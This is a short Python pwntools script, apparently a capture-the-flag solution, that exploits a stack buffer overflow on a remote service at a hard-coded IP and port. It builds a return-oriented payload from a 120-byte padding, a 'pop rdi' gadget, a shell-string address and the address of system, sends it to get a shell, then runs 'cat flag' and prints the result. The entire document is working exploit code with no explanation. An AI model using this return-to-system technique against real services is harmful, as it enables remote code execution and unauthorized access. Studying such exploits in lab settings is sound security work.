import pwn

conn = pwn.connect('3.71.110.92', 30015)

rip_offset = 120
pop_rdi = 0x4011a5.to_bytes(8, byteorder='little')
sh_string = 0x404050.to_bytes(8, byteorder='little')
system_addr = 0x401040.to_bytes(8, byteorder='little')
payload = b'A' * rip_offset + pop_rdi + sh_string + system_addr

with open('payload', 'w') as f:
    import os
    os.write(f.fileno(), payload)

conn.recvuntil(b': ')

conn.sendline(payload)

conn.recv()

conn.sendline(b'cat flag')
print(conn.recv())


conn.close()